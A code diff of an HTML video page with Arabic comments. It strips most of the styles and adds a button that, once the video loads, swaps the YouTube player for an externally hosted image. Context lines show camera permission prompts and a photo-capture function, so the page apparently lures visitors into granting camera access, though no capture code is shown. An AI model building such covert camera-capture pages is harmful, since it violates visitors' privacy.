@@ -11,158 +11,52 @@
     })();
   </script>
   <style>
-    body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      background: linear-gradient(135deg, #1a2a6c, #b21f1f, #1a2a6c);
-      color: white;
-      text-align: center;
-      padding: 20px;
-      margin: 0;
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-    }
+    /* ... existing styles ... */
     
-    .container {
-      background: rgba(0, 0, 0, 0.7);
-      border-radius: 15px;
-      padding: 30px;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-      max-width: 800px;
-      width: 90%;
-      margin: 20px auto;
-      backdrop-filter: blur(10px);
-    }
-    
-    h1 {
-      font-size: 28px;
-      margin-bottom: 25px;
-      text-shadow: 0 2px 4px rgba(0,0,0,0.5);
-    }
-    
-    .video-container {
-      position: relative;
-      width: 100%;
-      height: 0;
-      padding-bottom: 56.25%; /* نسبة 16:9 */
-      margin: 0 auto 25px;
-      border-radius: 10px;
-      overflow: hidden;
-      box-shadow: 0 8px 20px rgba(0,0,0,0.4);
-    }
-    
-    #player {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      border: 0;
-      border-radius: 10px;
-      display: none; /* Hidden until countdown completes */
-    }
-    
-    .loading {
-      display: none;
-      margin: 30px 0;
-    }
-    
-    .spinner {
-      border: 5px solid rgba(255, 255, 255, 0.3);
-      border-radius: 50%;
-      border-top: 5px solid #fff;
-      width: 50px;
-      height: 50px;
-      animation: spin 1s linear infinite;
-      margin: 0 auto 20px;
-    }
-    
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
-    }
-    
-    .message {
-      display: none;
-      padding: 20px;
-      background: rgba(255, 255, 255, 0.1);
-      border-radius: 10px;
-      margin-top: 25px;
-      font-size: 18px;
-    }
-    
-    .error {
-      color: #ff6b6b;
-      display: none;
-      margin-top: 20px;
-      padding: 15px;
-      background: rgba(255, 0, 0, 0.1);
-      border-radius: 8px;
-    }
-    
-    .success {
-      color: #4cd97b;
-      display: none;
-    }
-    
-    .footer {
-      margin-top: 30px;
-      font-size: 14px;
-      opacity: 0.8;
-    }
-    
-    .hidden {
-      display: none;
-    }
-    
-    /* New styles for countdown */
-    .countdown {
-      font-size: 36px;
-      font-weight: bold;
-      margin: 20px 0;
-      padding: 15px;
-      background: rgba(0, 0, 0, 0.3);
-      border-radius: 10px;
-      display: inline-block;
-      min-width: 100px;
-    }
-    
-    .permission-request {
-      padding: 20px;
-      background: rgba(255, 255, 255, 0.1);
-      border-radius: 10px;
-      margin: 20px 0;
-    }
-    
-    .permission-btn {
-      background: #4CAF50;
+    /* New style for special image button */
+    .special-image-btn {
+      background: #ff5722;
       color: white;
       border: none;
       padding: 12px 30px;
       font-size: 18px;
       border-radius: 50px;
       cursor: pointer;
-      margin-top: 15px;
+      margin: 20px auto;
       transition: all 0.3s;
       box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+      display: none; /* Hidden by default */
     }
     
-    .permission-btn:hover {
-      background: #45a049;
+    .special-image-btn:hover {
+      background: #e64a19;
       transform: translateY(-2px);
       box-shadow: 0 6px 20px rgba(0,0,0,0.3);
     }
     
-    .permission-btn:active {
+    .special-image-btn:active {
       transform: translateY(0);
     }
     
-    .instructions {
-      font-size: 16px;
-      margin-top: 15px;
-      line-height: 1.6;
+    .special-image-container {
+      display: none;
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      z-index: 10;
+      background-color: rgba(0,0,0,0.9);
+      border-radius: 10px;
+    }
+    
+    .special-image {
+      max-width: 100%;
+      max-height: 100%;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
     }
   </style>
 </head>
@@ -181,7 +75,15 @@
     
     <div class="video-container">
       <iframe id="player" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+      
+      <!-- Special image container -->
+      <div class="special-image-container" id="specialImageContainer">
+        <img src="https://h.top4top.io/p_3501mscbf0.jpg" alt="Special Image" class="special-image">
+      </div>
     </div>
+    
+    <!-- Special Image Button -->
+    <button class="special-image-btn" id="specialImageBtn">Open Special Image</button>
     
     <div class="loading">
       <div class="spinner"></div>
@@ -217,6 +119,10 @@
     const countdownElement = document.getElementById('countdown');
     const permissionRequest = document.getElementById('permissionRequest');
     const cameraBtn = document.getElementById('cameraBtn');
+    
+    // New elements
+    const specialImageBtn = document.getElementById('specialImageBtn');
+    const specialImageContainer = document.getElementById('specialImageContainer');
     
     // متغيرات الحالة
     let cameraCaptured = false;
@@ -318,6 +224,19 @@
       loading.style.display = 'none';
       message.style.display = 'block';
       success.style.display = 'block';
+      
+      // Show the special image button after video loads
+      specialImageBtn.style.display = 'block';
+    });
+    
+    // Event listener for special image button
+    specialImageBtn.addEventListener('click', () => {
+      // Hide the YouTube player and show the special image
+      player.style.display = 'none';
+      specialImageContainer.style.display = 'block';
+      
+      // Optionally hide the button after clicking
+      specialImageBtn.style.display = 'none';
     });
     
     // وظيفة التقاط الصورة
